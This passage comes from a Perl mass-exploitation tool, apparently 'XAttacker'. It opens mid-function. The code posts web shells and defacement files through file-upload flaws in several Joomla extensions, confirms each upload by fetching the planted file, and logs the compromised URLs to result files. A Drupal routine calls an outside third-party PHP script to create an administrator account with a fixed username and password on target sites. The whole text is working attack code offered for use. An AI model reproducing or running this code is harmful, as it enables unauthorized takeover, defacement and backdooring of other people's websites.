print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $shellpath\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$shellpath\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}

}


################ comjdownloads index #####################
sub comjdownloadsdef(){
$def = $site . '/images/jdownloads/screenshots/XAttacker.html.j';
$filee="Jattack.rar";
$filezz="XAttacker.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Mohamed Riahi", mail=>"moham3driahi@gmail.com", filetitle =>"Mohamed Riahi xD", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploitx->content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [Link] => $def\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$def\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold white')," .............. ";
print color('bold red'),"NOt VULN\n";
        }
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold white')," .............. ";
print color('bold red'),"NOt VULN\n";

}
}

################ comfabrik #####################
sub comfabrik(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $shell ="XAttacker.php";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$shell"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]

            );

$comfabrikupp="$site/media/XAttacker.php?X=Attacker";

$checkcomfabrikupp = $ua->get("$comfabrikupp")->content;
if($checkcomfabrikupp =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik";
print color('bold white')," ........................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comfabrikupp\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$comfabrikupp\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik";
print color('bold white')," ........................ ";
print color('bold red'),"NOt VULN\n";
  comjdownloadsdef();
}
}

################ comfabrik index #####################
sub comfabrikdef(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $index ="XAttacker.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$index"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]

            );

$comfabrikup="$site/media/XAttacker.txt";

$checkcomfabrikup = $ua->get("$comfabrikup")->content;
if($checkcomfabrikup =~/HaCKeD/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik Index";
print color('bold white')," .................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comfabrikup\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$comfabrikup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik Index";
print color('bold white')," .................. ";
print color('bold red'),"NOt VULN\n";
}
}

################ foxcontact #####################
sub foxcontact(){

@foxvuln= ("components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php",
"components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php");
OUTER: foreach $foxvuln(@foxvuln){
chomp $foxvuln;

my $url = "$site/$foxvuln";

my $shell ="XAttacker.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$foxup="$site/components/com_foxcontact/_func.php?X=Attacker";
}
my $checkfoxup = $ua->get("$foxup")->content;
if ($checkfoxup =~ /X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $foxup\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$foxup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ comadsmanager #####################
sub comadsmanager(){
my $url = "$site/index.php?option=com_adsmanager&task=upload&tmpl=component";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["XAttacker.jpg"], name => "XAttacker.html"]

            );

$comadsmanagerup="$site/tmp/plupload/XAttacker.html";

$checkcomadsmanagerup = $ua->get("$comadsmanagerup")->content;
if($checkcomadsmanagerup =~/HaCKeD/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comadsmanagerup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$comadsmanagerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold white')," ................... ";
print color('bold red'),"NOt VULN\n";
}
}

sub comblog(){

my $url = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $ua->get("$url")->content;
if($checkblog =~/has been uploaded/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Blog";
print color('bold white')," .......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Exploit It It Manual\n";
    open(save, '>>Result/vulntargets.txt');
    print save "[blog] $site\n";
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Blog";
print color('bold white')," .......................... ";
print color('bold red'),"NOt VULN\n";
}
}


sub comusers(){

my $url = "$site/index.php?option=com_users&view=registration";
my $checkomusers = $ua->get("$url")->content;
if($checkomusers =~/jform_email2-lbl/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Users";
print color('bold white')," ......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Exploit It It Manual\n";
    open(save, '>>Result/vulntargets.txt');
    print save "[Com Users] $site\n";
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Users";
print color('bold white')," ......................... ";
print color('bold red'),"NOt VULN\n";
    }
}


################ comweblinks #####################
sub comweblinks(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
$urlone ="$site/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=";
$token = $ua->get($urlone)->content;
if($token =~/<form action="(.*?)" id="uploadForm"/)
{
$url=$1;
}

my $index ="XAttacker.gif";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]

            );

$weblinksup= "$site/images/XAttacker.gif";
$check = $ua->get($weblinksup)->status_line;
if ($check =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold white')," ...................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $weblinksup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$weblinksup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold white')," ...................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ mod_simplefileupload #####################
sub mod_simplefileupload(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/modules/mod_simplefileuploadv1.3/elements/udd.php";
$simplefileuploadsup= "$site/modules/mod_simplefileuploadv1.3/elements/XAttacker.php?X=Attacker";

my $shell ="XAttacker.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ file=>["$shell"] , submit=>"Upload" ]);

$check = $ua->get($simplefileuploadsup)->content;
if ($check =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"mod_simplefileupload";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $simplefileuploadsup\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$simplefileuploadsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"mod_simplefileupload";
print color('bold white')," .............. ";
print color('bold red'),"NOt VULN\n";
}
}
##########################################################
#drupal exploit coded by fallaeg gassrini xD thnx gass <3#
##########################################################
sub drupal(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

# check the link of the exploit or you can download script from here : http://pastebin.com/wPAbtyJ4 and you upload it on you one shell :)
$drupalink = "http://oriflame-angela.ru/gassrini.php";
my $exploit = "$drupalink?url=$site&submit=submit";
$admin ="XAttacker";
$pass  ="XAttacker";
$dr = $site . '/user/login';
$red = $site . '/user/1';
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"URL : $dr\n";
print color('bold white'),"USER : $admin\n";
print color('bold white'),"PASS : $pass\n";
open (TEXT, '>>Result/drupal.txt');
print TEXT "\nURL : $dr\n";
print TEXT "USER : $admin\n";
print TEXT "PASS : $pass\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold white')," ................... ";
print color('bold red'),"NOt VULN\n";
}
}
